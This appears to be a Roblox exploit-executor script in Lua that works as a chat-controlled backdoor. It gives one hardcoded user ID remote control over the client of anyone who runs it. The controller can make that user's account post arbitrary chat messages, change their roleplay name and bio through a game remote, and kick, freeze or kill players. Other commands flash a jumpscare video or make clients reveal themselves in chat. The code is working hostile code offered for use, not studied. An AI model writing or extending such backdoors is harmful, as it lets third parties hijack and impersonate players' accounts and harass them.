--// ================== ENV PROTECTION ==================
local env = (getgenv and getgenv()) or _G

if env.specterVerifier then
    if env.specterVerifier.chatConnection then
        env.specterVerifier.chatConnection:Disconnect()
    end
end

env.specterVerifier = {}
local verifier = env.specterVerifier
--// =====================================================

--// Services
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

--// Local player
local localPlayer = Players.LocalPlayer

--// Admin config
local ADMIN_USER_IDS = {
    [10067326164] = true
}

--// Owner do script
local OwnerB2 = 1234567890 -- substitua pelo ID real

--// Commands
local VERIFY_COMMAND   = ";verifique"
local KICK_COMMAND     = ";kick"
local FREEZE_COMMAND   = ";freeze"
local UNFREEZE_COMMAND = ";unfreeze"
local TAG_COMMAND      = ";tag"
local BIO_COMMAND      = ";bio"
local CH_COMMAND       = ";ch"
local JUMPSCARE_COMMAND = ";jumpscare"
local KILL_COMMAND = ";kill"

local RESPONSE_MESSAGE = "Specter_####"

--// State
verifier.frozenPlayers = {}
verifier.lastVerify = 0
local VERIFY_COOLDOWN = 1.5

--// Chat channel
local generalChannel = TextChatService.TextChannels:WaitForChild("RBXGeneral")

--// Remote
local RPRemote = ReplicatedStorage:WaitForChild("RE"):WaitForChild("1RPNam1eTex1t")

--// ================== UTILS ==================
local function trim(s)
    return (s and s:match("^%s*(.-)%s*$")) or ""
end

local function findPlayerByPartialName(partial)
    if not partial then return end
    partial = partial:lower()
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower():find(partial, 1, true)
        or p.DisplayName:lower():find(partial, 1, true) then
            return p
        end
    end
end

local function sendChat(message)
    if message == "" then return end
    task.spawn(function()
        pcall(function()
            generalChannel:SendAsync(message)
        end)
    end)
end

--// ================== FREEZE ==================
local function freezePlayer(player)
    local token = {}
    verifier.frozenPlayers[player] = token

    task.spawn(function()
        while verifier.frozenPlayers[player] == token do
            task.wait(0.0001)
            local hum = player.Character and player.Character:FindFirstChildWhichIsA("Humanoid")
            if hum then
                hum.WalkSpeed = 0
                hum.JumpPower = 0
            end
        end
    end)
end

local function unfreezePlayer(player)
    verifier.frozenPlayers[player] = nil
    task.wait()
    local hum = player.Character and player.Character:FindFirstChildWhichIsA("Humanoid")
    if hum then
        hum.WalkSpeed = 16
        hum.JumpPower = 50
    end
end

--// ================== RP FUNCTIONS ==================
local function setRP(typeName, text)
    if not text or text == "" then return end
    local args = { typeName, text }
    pcall(function()
        RPRemote:FireServer(unpack(args))
    end)
end

--// ================== JUMPSCARE ==================
local function jumpscarePlayer(target)
    if not target.Character then return end
    local playerGui = target:FindFirstChildOfClass("PlayerGui")
    if not playerGui then return end

    task.spawn(function()
        local gui = Instance.new("ScreenGui")
        gui.ResetOnSpawn = false
        gui.IgnoreGuiInset = true
        gui.Parent = playerGui

        local blackFrame = Instance.new("Frame")
        blackFrame.Size = UDim2.fromScale(1,1)
        blackFrame.Position = UDim2.fromScale(0,0)
        blackFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
        blackFrame.BackgroundTransparency = 0
        blackFrame.Parent = gui

        local video = Instance.new("VideoFrame")
        video.Size = UDim2.fromScale(1,1)
        video.Position = UDim2.fromScale(0,0)
        video.Video = "rbxassetid://5608297917"
        video.Looped = false
        video.Playing = true
        video.Parent = gui

        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://79269122830574"
        sound.Looped = true
        sound.Parent = gui
        sound:Play()

        task.delay(5, function()
            if gui and gui.Parent then
                gui:Destroy()
            end
        end)
    end)
end

--// ================== KILL ==================
local function killPlayer(target)
    if not target.Character then return end
    local hum = target.Character:FindFirstChildWhichIsA("Humanoid")
    if hum then
        pcall(function()
            hum.Health = 0
        end)
    end
end

--// ================== LISTENER ==================
verifier.chatConnection = generalChannel.MessageReceived:Connect(function(msg)
    if not msg or not msg.TextSource then return end
    if not ADMIN_USER_IDS[msg.TextSource.UserId] then return end

    local text = trim(tostring(msg.Text))
    local lower = text:lower()

    local function canTarget(p)
        if not p then return false end
        if localPlayer.UserId == OwnerB2 then return true end
        if p.UserId == OwnerB2 then return false end
        if p == localPlayer then return false end
        return true
    end

    -- ;verifique
    if lower == VERIFY_COMMAND then
        local now = tick()
        if now - verifier.lastVerify < VERIFY_COOLDOWN then return end
        verifier.lastVerify = now

        -- OwnerB2 sempre pode enviar
        if localPlayer.UserId == OwnerB2 or localPlayer ~= msg.TextSource then
            sendChat(RESPONSE_MESSAGE)
        end
        return
    end

    -- ;kick
    if lower:sub(1, #KICK_COMMAND) == KICK_COMMAND then
        local name = trim(text:sub(#KICK_COMMAND + 2))
        local p = findPlayerByPartialName(name)
        if canTarget(p) then p:Kick("Você foi removido por um administrador.") end
        return
    end

    -- ;freeze
    if lower:sub(1, #FREEZE_COMMAND) == FREEZE_COMMAND then
        local name = trim(text:sub(#FREEZE_COMMAND + 2))
        local p = findPlayerByPartialName(name)
        if canTarget(p) then freezePlayer(p) end
        return
    end

    -- ;unfreeze
    if lower:sub(1, #UNFREEZE_COMMAND) == UNFREEZE_COMMAND then
        local name = trim(text:sub(#UNFREEZE_COMMAND + 2))
        local p = findPlayerByPartialName(name)
        if canTarget(p) then unfreezePlayer(p) end
        return
    end

    -- ;tag
    if lower:sub(1, #TAG_COMMAND) == TAG_COMMAND then
        local rest = trim(text:sub(#TAG_COMMAND + 2))
        local pName, message = rest:match("^(%S+)%s+(.+)$")
        local p = findPlayerByPartialName(pName)
        if canTarget(p) and message then
            setRP("RolePlayName", message)
        end
        return
    end

    -- ;bio
    if lower:sub(1, #BIO_COMMAND) == BIO_COMMAND then
        local rest = trim(text:sub(#BIO_COMMAND + 2))
        local pName, message = rest:match("^(%S+)%s+(.+)$")
        local p = findPlayerByPartialName(pName)
        if canTarget(p) and message then
            setRP("RolePlayBio", message)
        end
        return
    end

    -- ;ch
    if lower:sub(1, #CH_COMMAND) == CH_COMMAND then
        local rest = trim(text:sub(#CH_COMMAND + 2))
        local pName, message = rest:match("^(%S+)%s+(.+)$")
        local p = findPlayerByPartialName(pName)
        if canTarget(p) and message then
            sendChat(message)
        end
        return
    end

    -- ;jumpscare
    if lower:sub(1, #JUMPSCARE_COMMAND) == JUMPSCARE_COMMAND then
        local rest = trim(text:sub(#JUMPSCARE_COMMAND + 2))
        local p = findPlayerByPartialName(rest)
        if canTarget(p) then
            jumpscarePlayer(p)
        end
        return
    end

    -- ;kill
    if lower:sub(1, #KILL_COMMAND) == KILL_COMMAND then
        local rest = trim(text:sub(#KILL_COMMAND + 2))
        local p = findPlayerByPartialName(rest)
        if canTarget(p) then
            killPlayer(p)
        end
        return
    end

end)
